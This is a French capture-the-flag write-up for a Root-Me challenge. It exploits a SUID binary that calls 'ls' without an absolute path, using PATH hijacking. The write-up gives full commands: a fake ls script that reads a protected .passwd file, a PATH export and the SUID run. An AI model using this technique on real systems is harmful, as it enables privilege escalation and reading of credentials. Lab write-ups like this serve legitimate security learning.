System 2 — App-Script — Facile

Plateforme : Root-Me Lien Date de résolution : 24/09/2026

Contexte

Comme pour "Bash - System 1", le challenge fournit un accès SSH direct (identifiants dans l'énoncé) ainsi que le code source d'un programme C compilé, marqué SUID et appartenant à un second utilisateur. Le but est identique : lire un fichier .passwd normalement illisible avec les droits par défaut.

Code source fourni :

c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}

Seule différence visible avec "Bash - System 1" : la commande appelle ls -lA (avec options) au lieu d'un simple ls, mais la structure de la vulnérabilité reste identique.

Reconnaissance

Vérification des permissions du binaire et du fichier cible :

bash
ls -la ch12
# -rwsr-x--- 1 app-script-ch12-cracked app-script-ch12 7252 ...

ls -la .passwd
# -r--r----- 1 app-script-ch12-cracked app-script-ch12-cracked 14 ...

Le s sur les droits du propriétaire de ch12 confirme le bit SUID actif : le binaire s'exécute toujours avec les droits de app-script-ch12-cracked. Le fichier .passwd n'est lisible que par ce même compte, pas par app-script-ch12.

Découverte de la vulnérabilité

Même raisonnement que sur "Bash - System 1" : la commande ls est appelée par system() sans chemin absolu (/bin/ls), donc le shell interne va la chercher dans les dossiers listés par la variable $PATH, dans l'ordre. En plaçant un dossier contenant mon propre exécutable nommé ls en tête du $PATH, ce faux programme est exécuté à la place du véritable /bin/ls, avec les droits élevés du binaire SUID.

Les arguments -lA passés par le programme n'ont aucune incidence : mon faux script n'a pas besoin de les traiter, il se contente d'afficher directement le fichier cible.

Exploitation
Création d'un dossier de travail et d'un faux binaire ls :
bash
mkdir -p /tmp/monexploit2
cd /tmp/monexploit2
cat > ls << 'EOF'
#!/bin/bash
cat /challenge/app-script/ch12/.passwd
EOF
chmod +x ls
Modification du $PATH pour prioriser ce dossier :
bash
export PATH=/tmp/monexploit2:$PATH
Retour dans le dossier personnel et exécution du binaire SUID :
bash
cd ~
./ch12

Le programme exécute system("ls -lA ..."), le shell interne trouve mon faux ls en premier dans le $PATH et l'exécute avec les droits de app-script-ch12-cracked, affichant ainsi le contenu de .passwd.

Résultat

L'exécution a affiché directement le contenu du fichier .passwd, correspondant au mot de passe de validation du challenge. Le flag a été soumis sur la page Root-Me sans être republié ici, conformément aux règles de la plateforme.

Ce que j'ai appris

Ce challenge confirme qu'il ne suffit pas de changer les options d'une commande (ls vs ls -lA) pour se protéger d'un PATH hijacking : la faille ne réside pas dans les arguments passés, mais dans l'absence de chemin absolu pour la commande elle-même. C'est un bon rappel que face à un nouveau binaire SUID, la première chose à vérifier est toujours la même, indépendamment des détails de surface du programme : comment sont invoquées les commandes externes, et le $PATH peut-il être détourné avant l'appel.

Outils utilisés
SSH (client OpenSSH)
Bash (script du faux binaire ls)
ls -la (inspection des permissions)